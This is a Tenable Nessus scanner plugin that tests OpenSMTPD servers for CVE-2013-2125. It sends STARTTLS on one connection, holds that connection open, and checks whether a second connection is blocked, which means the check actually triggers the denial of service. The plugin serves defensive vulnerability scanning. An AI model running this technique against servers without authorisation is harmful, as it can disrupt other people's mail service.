#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(66586);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2017/02/08 22:04:49 $");

  script_cve_id("CVE-2013-2125");
  script_bugtraq_id(59985);
  script_osvdb_id(93495);

  script_name(english:"OpenSMTPD TLS Blocking Socket Remote DoS");
  script_summary(english:"Tries to exploit denial of service attack");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote mail server is affected by a denial of service
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote OpenSMTPD mail server has a flaw that could result in
further connections to it being blocked when a client holds open a TLS
connection."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.opensmtpd.org/announces/release-5.3.2.txt");
  # http://git.zx2c4.com/OpenSMTPD/commit/?id=38b26921bad5fe24ad747bf9d591330d683728b0
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?fab189bb");
  script_set_attribute(attribute:"solution", value:"Either apply the patch or upgrade to OpenSMTPD 5.3.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/05/18");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/05/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/05/24");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:openbsd:opensmtpd");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"SMTP problems");

  script_copyright(english:"This script is Copyright (C) 2013-2017 Tenable Network Security, Inc.");

  script_require_ports("Services/smtp", 25, 587);
  script_dependencies("smtp_starttls.nasl", "find_service1.nasl", "smtpserver_detect.nasl");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("smtp_func.inc");

port = get_service(svc:"smtp", default:587, exit_on_fail:TRUE);

banner = get_kb_item_or_exit("smtp/banner/" + port);
if ("ESMTP OpenSMTPD" >!< banner) audit(AUDIT_NOT_LISTEN, "OpenSMTPD", port);

get_kb_item_or_exit("smtp/"+port+"/starttls");

soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port);

timeout = get_kb_item("smtp/"+port+"/greetpause");
if (isnull(timeout)) timeout = 30;
socket_set_timeout(socket:soc, timeout:timeout);

hostname = get_kb_item('smtp/'+ port + '/helo');
if (!hostname) hostname = 'nessus';

banner = smtp_recv_line(socket:soc, code:"220");

if ("ESMTP OpenSMTPD" >!< banner)
{
  close(soc);
  audit(AUDIT_NOT_LISTEN, "OpenSMTPD", port);
}

send(socket:soc, data:'EHLO ' + hostname + '\r\n');
res = smtp_recv_line(socket:soc, code:"250");

if (isnull(res) || res == '' || 'pleased to meet you' >!< res)
{
  close(soc);
  exit(1, "The SMTP server on port " + port + " didn't respond to 'EHLO'.");
}

# double check, although KB check above should have already verified this
if ('250-STARTTLS' >!< res)
{
  close(soc);
  exit(0, "STARTTLS is not supported on port " + port + ".");
}

# now, send STARTTLS, we don't need to fully negotiate a TLS
# connection in order to exploit the vuln
send(socket: soc, data: 'STARTTLS\r\n');

res = smtp_recv_line(socket:soc, code:"220");
if("Ready to start TLS" >!< res)
{
  close(soc);
  exit(1, "Unable to STARTTLS with SMTP server on port " + port + ".");
}

soc1 = open_sock_tcp(port);
if (!soc1)
{
  close(soc);
  audit(AUDIT_SOCK_FAIL, port);
}

socket_set_timeout(socket:soc1, timeout:timeout);

vuln = TRUE;

banner = '';
for (attempts = 0; attempts < 5; attempts++)
{
  res = smtp_recv_line(socket:soc1, code:"220");
  if (strlen(res))
  {
    banner += res;

    # see if our first connection with STARTTLS is blocking the second connection
    # if successful, we won't see a banner and our DoS is a success
    if ("OpenSMTPD" >< banner)
    {
      vuln = FALSE;
      break;
    }
  }
  sleep(1);
}

close(soc1);
close(soc);

if (vuln)
{
  if (report_verbosity > 0)
  {
    if (banner == '')
    {
      report =
      '\nNessus confirmed the vulnerability since it failed to receive any' +
      '\ndata from the server after 5 attempts on a second connection while' +
      '\nwhile holding the first connection open.\n';
    }
    else
    {
      report =
      '\nNessus confirmed the vulnerability since it failed to receive an' +
      '\nOpenSMTPD banner from the server after 5 attempts on a second' +
      '\nconnection while holding the first connection open.\n' +
      '\n  Server response : ' + chomp(banner) + '\n';
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else
  audit(AUDIT_LISTEN_NOT_VULN, "OpenSMTPD", port);
